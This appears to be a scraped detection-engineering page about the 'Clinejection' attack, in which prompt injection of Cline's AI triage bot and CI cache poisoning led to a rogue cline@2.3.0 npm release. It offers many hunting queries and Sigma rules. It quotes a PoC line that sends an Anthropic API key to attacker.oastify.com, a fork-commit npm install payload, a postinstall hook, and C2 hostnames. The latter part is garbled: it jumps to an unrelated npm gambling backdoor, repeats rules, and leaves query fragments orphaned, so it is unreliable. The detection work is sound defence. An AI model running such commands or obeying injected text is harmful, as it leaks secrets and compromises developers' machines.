High

How “Clinejection” Turned an AI Bot into a Supply Chain Attack

Snyk
2026-02-19 6 use cases 2 techniques 8 kill-chain phases detected

The Clinejection vulnerability chain illustrates a dangerous new era of supply chain attacks where AI agents are turned into exploit vectors. By combining indirect prompt injection with GitHub Actions cache poisoning, attackers successfully pushed unauthorized code to thousands of developers. This incident highlights the critical need for hardened CI/CD pipelines and rigorous security for AI-assisted coding tools.

ATT&CKT1190 T1195.002
Domainsattacker.oastify.com

Actions on Objectives
Detected
Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer). → [LLM] npm install referencing GitHub commit SHA (github:owner/repo#sha) — dangling-commit supply chain hunt
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad). → [LLM] Installation of unauthorized cline@2.3.0 npm package on developer endpoints
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Secondary payload install: 'npm install -g openclaw' postinstall hook execution
Command & Control. Beacon to attacker infrastructure for control and tasking. → Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage.
[LLM] Installation of unauthorized cline@2.3.0 npm package on developer endpoints Delivery High
Hunts for the explicit unauthorized version string 'cline@2.3.0' in npm/node/yarn/pnpm command lines on dev workstations. cline@2.3.0 was the malicious build published by an unknown actor on Feb 17 2026 using a still-active NPM_RELEASE_TOKEN that was not properly revoked after the Feb 9 disclosure; it lived on registry.npmjs.org for ~8 hours and was downloaded ~4,000 times before being deprecated and replaced by 2.4.0. Rationale: 'cline@2.3.0' is the exact unauthorized version string published Feb 17 2026 per the article timeline (GHSA-9ppg-jx86-fqw7). The version IOC is unique enough that any explicit reference in a node-toolchain process tree is high-fidelity. Corroborated against StepSecurity's confirmation of ~4,000 downloads in the 8h window and the Cline 2.4.0 deprecation notice on npm. Cross-checked against: • https://www.stepsecurity.io/blog/cline-supply-chain-attack-detected-cline-2-3-0-silently-installs-openclaw • https://thehackernews.com/2026/02/cline-cli-230-supply-chain-attack.html • https://adnanthekhan.com/posts/clinejection/ • https://github.com/advisories/GHSA-9ppg-jx86-fqw7
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(90d)
| where ProcessCommandLine has "cline@2.3.0" or InitiatingProcessCommandLine has "cline@2.3.0"
| where FileName in~ ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","npx.exe","npx.cmd")
    or InitiatingProcessFileName in~ ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","cmd.exe","powershell.exe","pwsh.exe","bash.exe")
| where AccountName !endswith "$"
| project Timestamp, DeviceName, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(90d)
| where EventID == 4688
| where CommandLine has "cline@2.3.0"
| where NewProcessName has_any ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","npx.exe","npx.cmd")
    or ParentProcessName has_any ("npm.exe","npm.cmd","node.exe","cmd.exe","powershell.exe","pwsh.exe","bash.exe")
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc
title: Unauthorized cline@2.3.0 npm Package Install (Clinejection Supply Chain)
id: 4a9c1b3e-7d2f-4e8c-9a51-cf3b2d8e1a47
description: Detects npm/node/yarn/pnpm command line invocations referencing the unauthorized cline@2.3.0 build that was published via a compromised NPM_RELEASE_TOKEN on Feb 17 2026 and bundled a postinstall hook installing OpenClaw globally.
references:
  - https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/
  - https://github.com/advisories/GHSA-9ppg-jx86-fqw7
  - https://www.stepsecurity.io/blog/cline-supply-chain-attack-detected-cline-2-3-0-silently-installs-openclaw
author: SOC Detection Engineering
date: 2026/05/21
tags:
  - attack.t1195.002
  - attack.initial_access
logsource:
  category: process_creation
  product: windows
detection:
  selection_image:
    Image|endswith:
      - '\npm.exe'
      - '\npm.cmd'
      - '\node.exe'
      - '\yarn.exe'
      - '\pnpm.exe'
      - '\pnpm.cmd'
      - '\npx.exe'
      - '\npx.cmd'
  selection_cli:
    CommandLine|contains: 'cline@2.3.0'
  condition: selection_image and selection_cli
level: high
(source:windows.sysmon OR source:windows.security) (@CommandLine:*cline@2.3.0* OR @ParentCommandLine:*cline@2.3.0*) (@Image:(*\\npm.exe OR *\\NPM.EXE OR *\\npm.cmd OR *\\node.exe OR *\\NODE.EXE OR *\\yarn.exe OR *\\pnpm.exe OR *\\npx.cmd OR *\\NPX.CMD) OR @ParentImage:(*\\npm.exe OR *\\node.exe OR *\\cmd.exe OR *\\powershell.exe OR *\\pwsh.exe OR *\\bash.exe))
#event_simpleName=ProcessRollup2 (CommandLine=/cline@2\.3\.0/i)
| (ImageFileName=/\\(npm|node|yarn|pnpm|npx)(\.exe|\.cmd)?$/i OR ParentBaseFileName=/(npm|node|yarn|pnpm|npx)(\.exe|\.cmd)?$/i)
| groupBy([aid, ComputerName, UserName, ImageFileName, CommandLine, ParentBaseFileName], function=count())
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats summariesonly=true count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process="*cline@2.3.0*" OR Processes.parent_process="*cline@2.3.0*") (Processes.process_name IN ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","npx.exe","npx.cmd") OR Processes.parent_process_name IN ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd")) by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name | `drop_dm_object_name(Processes)` | where NOT match(user,"\\$$") | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime from datamodel=Endpoint.Processes where (Processes.process="*cline@2.3.0*" OR Processes.parent_process="*cline@2.3.0*") (Processes.process_name IN ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","npx.exe","npx.cmd") OR Processes.parent_process_name IN ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd")) by Processes.dest Processes.user Processes.process_name Processes.process Processes.parent_process_name | `drop_dm_object_name(Processes)` | where NOT match(user,"\\$$") | `security_content_ctime(firstTime)` | `security_content_ctime(lastTime)`
[LLM] Secondary payload install: 'npm install -g openclaw' postinstall hook execution Installation High
Hunts for the OpenClaw AI agent being globally installed via npm — the postinstall payload that cline@2.3.0 bundled. Fires on either the explicit 'openclaw' string in an npm/node command line or the creation of a node_modules\openclaw directory under the global npm prefix. Rationale: Per Snyk + Dark Reading + StepSecurity, the actual production exploit payload on cline@2.3.0 was a single-line postinstall hook 'npm install -g openclaw@latest'. The OpenClaw package name is article-specific and is essentially unique on npm — any reference in a node-toolchain command line on a corporate endpoint is the secondary payload firing. File-drop branch catches cases where AMSI/cmdline logging is missing but file events survive. Cross-checked against: • https://www.stepsecurity.io/blog/cline-supply-chain-attack-detected-cline-2-3-0-silently-installs-openclaw • https://www.darkreading.com/application-security/supply-chain-attack-openclaw-cline-users • https://adnanthekhan.com/posts/clinejection/
ATT&CKT1195.002 T1546
Data sourcesEndpoint.Processes Endpoint.Filesystem
let ProcSig = DeviceProcessEvents
    | where Timestamp > ago(30d)
    | where ProcessCommandLine has "openclaw" or InitiatingProcessCommandLine has "openclaw"
    | where FileName in~ ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","npx.exe","npx.cmd")
        or InitiatingProcessFileName in~ ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","cmd.exe","powershell.exe","pwsh.exe","bash.exe")
    | where AccountName !endswith "$"
    | project Timestamp, DeviceName, AccountName, Source="Process", Detail=ProcessCommandLine, Parent=InitiatingProcessFileName;
let FileSig = DeviceFileEvents
    | where Timestamp > ago(30d)
    | where FolderPath has @"\node_modules\openclaw"
    | where InitiatingProcessAccountName !endswith "$"
    | project Timestamp, DeviceName, AccountName=InitiatingProcessAccountName, Source="FileDrop", Detail=FolderPath, Parent=InitiatingProcessFileName;
union ProcSig, FileSig
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where CommandLine has "openclaw"
| where NewProcessName has_any ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","npx.exe","npx.cmd")
    or ParentProcessName has_any ("npm.exe","npm.cmd","node.exe","cmd.exe","powershell.exe","pwsh.exe","bash.exe")
| where not(SubjectUserName endswith "$")
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, CommandLine, ParentProcessName
| order by TimeGenerated desc

[LLM] Outbound traffic to *.oastify.com (BurpSuite Collaborator) from corporate endpoint exfiltration High
Hunts for any outbound network/DNS resolution to *.oastify.com or *.burpcollaborator.net — the exfiltration channel used by the Clinejection prompt-injection PoC ('curl -d "$ANTHROPIC_API_KEY" https://attacker.oastify.com') and a known BurpSuite Collaborator dual-use exfil sink. In any org outside authorized pentest engagements, hits are nearly always either offensive-security training labs or active exfiltration. Rationale: The article explicitly cites 'curl -d "$ANTHROPIC_API_KEY" https://attacker.oastify.com' as the proof-of-concept exfil payload Khan delivered via the prompt injection. oastify.com is the canonical BurpSuite Collaborator domain (PortSwigger) — its presence in production telemetry without a documented authorized engagement is a strong exfil/recon indicator. safedep.io's January 2026 research independently corroborates 50+ malicious npm packages using oastify.com as exfil sink, so this detection covers a much wider class than just Clinejection. Cross-checked against: • https://safedep.io/burp-collaborator-for-dependency-confusion-attack/ • https://portswigger.net/burp/documentation/desktop/tools/collaborator • https://www.aikido.dev/blog/the-malware-dating-guide-understanding-the-types-of-malware-on-npm
ATT&CKT1041 T1071.001 T1567
Data sourcesNetwork_Resolution.DNS Network_Traffic.All_Traffic
DeviceNetworkEvents
| where Timestamp > ago(30d)
| where RemoteUrl endswith "oastify.com" or RemoteUrl endswith "burpcollaborator.net"
    or RemoteUrl has ".oastify.com/" or RemoteUrl has ".burpcollaborator.net/"
| where InitiatingProcessAccountName !endswith "$"
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, InitiatingProcessCommandLine, RemoteUrl, RemoteIP, RemotePort, Protocol
| order by Timestamp desc
union isfuzzy=true
  (DnsEvents
   | where TimeGenerated > ago(30d)
   | where Name endswith "oastify.com" or Name endswith "burpcollaborator.net"
   | project TimeGenerated, Computer, Source="DnsEvents", Domain=Name, ClientIP, QueryType),
  (CommonSecurityLog
   | where TimeGenerated > ago(30d)
   | where RequestURL has "oastify.com" or RequestURL has "burpcollaborator.net"
       or DestinationDnsDomain endswith "oastify.com" or DestinationDnsDomain endswith "burpcollaborator.net"
   | project TimeGenerated, Computer=SourceHostName, Source="Proxy", Domain=coalesce(DestinationDnsDomain, RequestURL), ClientIP=SourceIP, QueryType=RequestMethod),
  (ImDnsActivity
   | where TimeGenerated > ago(30d)
   | where DnsQuery endswith "oastify.com" or DnsQuery endswith "burpcollaborator.net"
   | project TimeGenerated, Computer=DvcHostname, Source="ASIM", Domain=DnsQuery, ClientIP=SrcIpAddr, QueryType=DnsQueryTypeName)
| order by TimeGenerated desc

[LLM] npm install referencing GitHub commit SHA (github:owner/repo#sha) — dangling-commit supply chain hunt Weaponization Medium
Hunts for npm/yarn/pnpm command lines that install a dependency by GitHub fork-commit reference (e.g. 'npm install github:cline/cline#aaaaaaaa'). This is the Clinejection delivery mechanism — an attacker pushes a commit to a fork, the parent repo URL resolves to it via dangling-commit semantics, and the install runs arbitrary preinstall scripts under whatever identity ran npm. Rare in legitimate workflows; common in AI-agent / CI compromise. Rationale: The article literally quotes the Clinejection PoC payload: 'npm install github:cline/cline#aaaaaaaa'. The 'github:owner/repo#<sha>' shorthand is documented npm syntax but very rarely used in production package.json files (developers normally use semver or git+https://). Combined with the dangling-commit fork trick — where the commit survives after the fork is deleted — it is the article-specific delivery vector. Adnan Khan's own writeup confirms the exact pattern; grith.ai independently corroborates the technique used in the Cline compromise. Cross-checked against: • https://adnanthekhan.com/posts/clinejection/ • https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another • https://www.cremit.io/blog/ai-supply-chain-attack-clinejection
ATT&CKT1195.001 T1059 T1546.016
Data sourcesEndpoint.Processes
DeviceProcessEvents
| where Timestamp > ago(30d)
| where ProcessCommandLine matches regex @"(?i)github:[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+#[A-Fa-f0-9]{6,40}"
    or InitiatingProcessCommandLine matches regex @"(?i)github:[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+#[A-Fa-f0-9]{6,40}"
| where FileName in~ ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","npx.exe","npx.cmd")
    or InitiatingProcessFileName in~ ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd")
| where AccountName !endswith "$"
| extend GitRef = extract(@"(?i)(github:[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+#[A-Fa-f0-9]{6,40})", 1, strcat(ProcessCommandLine, " ", InitiatingProcessCommandLine))
| project Timestamp, DeviceName, AccountName, FileName, GitRef, ProcessCommandLine, InitiatingProcessFileName, InitiatingProcessCommandLine, FolderPath
| order by Timestamp desc
SecurityEvent
| where TimeGenerated > ago(30d)
| where EventID == 4688
| where CommandLine matches regex @"(?i)github:[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+#[A-Fa-f0-9]{6,40}"
| where NewProcessName has_any ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd","npx.exe","npx.cmd")
    or ParentProcessName has_any ("npm.exe","npm.cmd","node.exe","yarn.exe","pnpm.exe","pnpm.cmd")
| where not(SubjectUserName endswith "$")
| extend GitRef = extract(@"(?i)(github:[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+#[A-Fa-f0-9]{6,40})", 1, CommandLine)
| project TimeGenerated, Computer, SubjectUserName, NewProcessName, GitRef, CommandLine, ParentProcessName
| order by TimeGenerated desc
title: npm Install from GitHub Fork Commit SHA (Clinejection Dangling-Commit Pattern)
id: 9b3c6a82-04df-4e15-83a6-2c7b58d91e6a
description: Hunts for the 'github:owner/repo#<sha>' npm/yarn/pnpm install reference. This URI form resolves to a specific commit which — due to GitHub's fork architecture — can be accessed via the parent repository's URL even from a forked, deleted commit (dangling commit). The Clinejection exploit used this exact pattern to smuggle a malicious package.json with a credential-exfil preinstall hook.
references:
  - https://snyk.io/blog/cline-supply-chain-attack-prompt-injection-github-actions/
  - https://adnanthekhan.com/posts/clinejection/
  - https://grith.ai/blog/clinejection-when-your-ai-tool-installs-another
author: SOC Detection Engineering
date: 2026/05/21
tags:
  - attack.t1195.001
  - attack.t1546.016
  - attack.execution
logsource:
  category: process_creation
  product: windows
detection:
  selection_image:
    Image|endswith:
      - '\npm.exe'
      - '\npm.cmd'
      - '\node.exe'
      - '\yarn.exe'
      - '\pnpm.exe'
      - '\pnpm.cmd'
      - '\npx.exe'
      - '\npx.cmd'
  selection_cli:
    CommandLine|re: '(?i)github:[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+#[A-Fa-f0-9]{6,40}'
  condition: selection_image and selection_cli
level: medium
(source:windows.sysmon OR source:windows.security OR source:linux.auditd) (@Image:(*\\npm.exe OR *\\NPM.EXE OR *\\node.exe OR *\\yarn.exe OR *\\pnpm.exe OR *\\npx.cmd) OR @ParentImage:(*\\npm.exe OR *\\node.exe OR *\\yarn.exe OR *\\pnpm.exe) OR @process.executable.path:(*/npm OR */node OR */yarn OR */pnpm OR */npx)) (@CommandLine:*github\:* OR @process.command_line:*github\:*) (@CommandLine:*\#* OR @process.command_line:*\#*)
#event_simpleName=ProcessRollup2 (ImageFileName=/\\(npm|node|yarn|pnpm|npx)(\.exe|\.cmd)?$/i OR ParentBaseFileName=/(npm|node|yarn|pnpm|npx)(\.exe|\.cmd)?$/i)
| regex("(?i)github:[A-Za-z0-9_.\\-]+/[A-Za-z0-9_.\\-]+#[A-Fa-f0-9]{6,40}", field=CommandLine)
| groupBy([aid, ComputerName, UserName, CommandLine, ImageFileName], function=count())

title: Trusted Vendor Binary Launching Unusual Children
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d09
status: experimental
description: |
    A signed vendor binary (in the article's named-vendors list)
    spawning script-host or LOLBin children. Strongest signal when
    paired with a recent CVE / supply-chain advisory naming the same
    vendor.
references:
    - https://attack.mitre.org/techniques/T1195/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1195
    - attack.initial-access
logsource:
    category: process_creation
    product: windows
detection:
    selection_child:
        Image|endswith:
            - '\powershell.exe'
            - '\pwsh.exe'
            - '\cmd.exe'
            - '\rundll32.exe'
            - '\regsvr32.exe'
            - '\mshta.exe'
            - '\wscript.exe'
            - '\cscript.exe'
            - '\wmic.exe'
            - '\bitsadmin.exe'
    selection_parent_vendor:
        ParentImage|contains:
            - '\Program Files\'
            - '\Program Files (x86)\'
    condition: selection_child and selection_parent_vendor
falsepositives:
    - Many — installers and updaters legitimately spawn children. Pin
      the parent path to specific vendor binaries observed in the
      article before alerting.
level: medium
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")
    by Processes.dest, Processes.user, Processes.parent_process_name, Processes.process_name, Processes.process
| `drop_dm_object_name(Processes)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Processes
    where Processes.parent_process_name IN ("setup.exe","installer.exe","update.exe")
      AND Processes.process_name IN ("powershell.exe","cmd.exe","rundll32.exe","regsvr32.exe","mshta.exe","wscript.exe","cscript.exe","wmic.exe","bitsadmin.exe")

| `drop_dm_object_name(Processes)`

title: Browser Extension Installation via Registry
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0a
status: experimental
description: |
    Registry writes under the browser extension policy keys —
    administrative install of an extension. Often used by adware /
    info-stealers to bypass user-level extension controls.
references:
    - https://attack.mitre.org/techniques/T1176/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1176
    - attack.persistence
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\Software\Google\Chrome\Extensions\'
            - '\Software\Microsoft\Edge\Extensions\'
            - '\Software\Mozilla\Firefox\Extensions\'
    condition: selection
falsepositives:
    - Group-policy-managed extension whitelists
level: medium
ENDPOINT

        OR Registry.registry_path="*\Software\Mozilla\Firefox\Extensions\*")
    by Registry.dest, Registry.registry_path, Registry.registry_value_data, Registry.registry_value_name, Registry.user
| `drop_dm_object_name(Registry)`

| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`
| tstats summariesonly=false count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`

title: Browser Extension Installation via Registry
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d0a
status: experimental
description: |
    Registry writes under the browser extension policy keys —
    administrative install of an extension. Often used by adware /
    info-stealers to bypass user-level extension controls.
references:
    - https://attack.mitre.org/techniques/T1176/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1176
    - attack.persistence
logsource:
    category: registry_event
    product: windows
detection:
    selection:
        TargetObject|contains:
            - '\Software\Google\Chrome\Extensions\'
            - '\Software\Microsoft\Edge\Extensions\'
            - '\Software\Mozilla\Firefox\Extensions\'
    condition: selection
falsepositives:
    - Group-policy-managed extension whitelists
level: medium
ENDPOINT

        OR Registry.registry_path="*\Software\Mozilla\Firefox\Extensions\*")
    by Registry.dest, Registry.registry_path, Registry.registry_value_data, Registry.registry_value_name, Registry.user

Data sourcesEndpoint.Filesystem DeviceFileEvents
DeviceFileEvents
| where Timestamp > ago(7d)
| where InitiatingProcessAccountName !endswith "$"

| where FileName in~ ("Login Data","Cookies","logins.json","cookies.sqlite")
| where InitiatingProcessFileName !in~ ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
| project Timestamp, DeviceName, InitiatingProcessAccountName, InitiatingProcessFileName, FolderPath, FileName, ActionType

| project TimeGenerated, DvcHostname, ActorUsername, ActingProcessName,

title: Infostealer - Non-Browser Process Accessing Browser Credential Stores
id: 7c8b2e10-4d4f-4a8c-9c1f-bf6e2c4a8d01
status: experimental
description: |
    Stealers (RedLine, Lumma, Vidar, Atomic) read Login Data / cookies
    SQLite databases from Chrome/Edge/Firefox profile directories. Any
    non-browser process touching these files is a high-fidelity signal.
references:
    - https://attack.mitre.org/techniques/T1539/
    - https://attack.mitre.org/techniques/T1555/003/
author: Clankerusecase
date: 2026/05/02
tags:
    - attack.t1539
    - attack.t1555.003
    - attack.credential-access
logsource:
    category: file_access
    product: windows
detection:
    selection_path:
        TargetFilename|contains:
            - '\Google\Chrome\User Data\'
            - '\Microsoft\Edge\User Data\'
            - '\Mozilla\Firefox\Profiles\'
    selection_file:
        TargetFilename|endswith:
            - '\Login Data'
            - '\Cookies'
            - '\logins.json'
            - '\cookies.sqlite'
    filter_browser:
        Image|endswith:
            - '\chrome.exe'
            - '\msedge.exe'
            - '\firefox.exe'
            - '\brave.exe'
            - '\opera.exe'
    condition: selection_path and selection_file and not filter_browser
falsepositives:
    - Backup utilities reading user profile files
    - Browser sync agents from non-stock vendors
level: high
ENDPOINT
Toggle if your env has no CIM data-model acceleration.
| tstats `summariesonly` count min(_time) as firstTime max(_time) as lastTime
    from datamodel=Endpoint.Filesystem
    where (Filesystem.file_path="*\Google\Chrome\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Google\Chrome\User Data\*\Cookies*"
        OR Filesystem.file_path="*\Microsoft\Edge\User Data\*\Login Data*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\logins.json*"
        OR Filesystem.file_path="*\Mozilla\Firefox\Profiles\*\cookies.sqlite*")
      AND NOT Filesystem.process_name IN ("chrome.exe","msedge.exe","firefox.exe","brave.exe","opera.exe")
    by Filesystem.dest, Filesystem.process_name, Filesystem.file_path, Filesystem.user
| `drop_dm_object_name(Filesystem)`

Reconnaissance. Attacker researches the target — OSINT, scanning, enumeration.
Weaponization. Coupling exploit code with deliverable payload (e.g. weaponized PDF/Office doc, trojanized installer).
Delivery. Transmitting the weapon (phishing email, USB, watering hole, drive-by, malicious ad).
Exploitation. Triggering the exploit — vulnerability/macro/trust abuse to execute code. → Trusted vendor binary / installer launching unusual children · Article-specific behavioural hunt — npm backdoor lets hackers hijack gambling outcomes
Installation. Establishing persistence on the host — backdoor, service, scheduled task, registry key. → [LLM] Installation of sidoraress malicious npm packages (json-bigint-extend/jsonfb/jsonfx)
Command & Control. Beacon to attacker infrastructure for control and tasking. → [LLM] Egress to sidoraress json-bigint-extend gambling backdoor C2 infrastructure · [LLM] Inbound HTTP request bearing sidoraress backdoor x-operation operator tokens · Network connections to article IPs / domains
Actions on Objectives. Lateral movement, credential dumping, data theft, ransomware, sabotage. → Crypto-wallet file/keystore access by non-wallet process · Infostealer — non-browser process accessing browser cookie/login DBs
[LLM] Egress to sidoraress json-bigint-extend gambling backdoor C2 infrastructure Command & Control High
Hunts outbound HTTP/DNS traffic from Node.js servers to the five C2 hostnames hard-coded in the json-bigint-extend / jsonfb / jsonfx backdoor (payment.y1pay.vip, payment.snip-site.cc, gameland.21game.live, gameland.myapptest.top, gameland.nbzysp1.com). The backdoor polls /v1/risk/get-risk-code on these hosts every 30 seconds to fetch the gameplay-rewriting payload, so any successful contact is high-fidelity evidence that an infected dependency reached its trigger environment. Rationale: All five hostnames are listed as IOCs by Aikido and verified through the article's narrative description of the polling loop (riskCode refresh every 30s against /v1/risk/get-risk-code on payment.y1pay.vip). The domains are typo-squat / DGA-style infrastructure with no legitimate use — a single hit is a confirmed compromise. The /v1/risk/get-risk-code and /v1/risk/log paths add a second high-fidelity match surface if hostnames are proxied through a CDN. Cross-checked against: • https://www.aikido.dev/blog/npm-backdoor-lets-hackers-hijack-gambling-outcomes • https://github.com/sidorares/json-bigint
ATT&CKT1071.001 T1568.002 T1195.002
Data sourcesWeb.Web Network_Resolution.DNS Network_Traffic.All_Traffic
let _c2_hosts = dynamic(["payment.y1pay.vip","payment.snip-site.cc","gameland.21game.live","gameland.myapptest.top","gameland.nbzysp1.com"]);
let _c2_paths = dynamic(["/v1/risk/get-risk-code","/v1/risk/log"]);

  (DeviceNetworkEvents
   | where Timestamp > ago(30d)
   | where RemoteUrl has_any (_c2_hosts) or RemoteUrl has_any (_c2_paths)
   | project Timestamp, DeviceName, ActionType, RemoteUrl, RemoteIP, RemotePort,
             InitiatingProcessFileName, InitiatingProcessCommandLine,
             InitiatingProcessFolderPath, InitiatingProcessAccountName, InitiatingProcessSHA256),

   | where Timestamp > ago(30d)

   | extend QueryName = tostring(parse_json(AdditionalFields).QueryName)
   | where QueryName has_any (_c2_hosts) or QueryName endswith ".y1pay.vip" or QueryName endswith ".snip-site.cc" or QueryName endswith ".21game.live" or QueryName endswith ".myapptest.top" or QueryName endswith ".nbzysp1.com"
   | project Timestamp, DeviceName, ActionType, QueryName, InitiatingProcessFileName, InitiatingProcessCommandLine, InitiatingProcessAccountName)

| order by TimeGenerated desc

[LLM] Installation of sidoraress malicious npm packages (json-bigint-extend/jsonfb/jsonfx) Installation High
Detects developer, build-server, or CI/CD process events where npm/yarn/pnpm/npx is invoked with one of the three confirmed malicious package names from the sidoraress / infinitynodestudio cluster. Because the backdoor only fires when SERVICE_NAME matches the target gambling platform, install-time detection is the cleanest pre-trigger choke point. Rationale: Package names jsonfb, jsonfx, and json-bigint-extend are listed as IOCs in the Aikido article and confirmed by checking npm — the legitimate maintainer of json-bigint is `sidorares` (single s) while the malicious cluster publishes under `sidoraress` (double s) and `infinitynodestudio`. Pairing the unique package strings with an npm-family tool binary eliminates any chance of incidental string hits. Detection runs install-time, before the SERVICE_NAME-gated payload activates. Cross-checked against: • https://www.aikido.dev/blog/npm-backdoor-lets-hackers-hijack-gambling-outcomes • https://www.npmjs.com/package/json-bigint • https://github.com/sidorares/json-bigint
ATT&CKT1195.002 T1059.007
Data sourcesEndpoint.Processes
let _pkg_managers = dynamic(["npm.exe","node.exe","yarn.exe","pnpm.exe","npx.exe","npm","node","yarn","pnpm","npx"]);
DeviceProcessEvents
| where Timestamp > ago(30d)
| where FileName in~ (_pkg_managers) or InitiatingProcessFileName in~ (_pkg_managers)
| where (ProcessCommandLine has_any ("jsonfb","jsonfx") or ProcessCommandLine contains "json-bigint-extend")
     or (InitiatingProcessCommandLine has_any ("jsonfb","jsonfx") or InitiatingProcessCommandLine contains "json-bigint-extend")
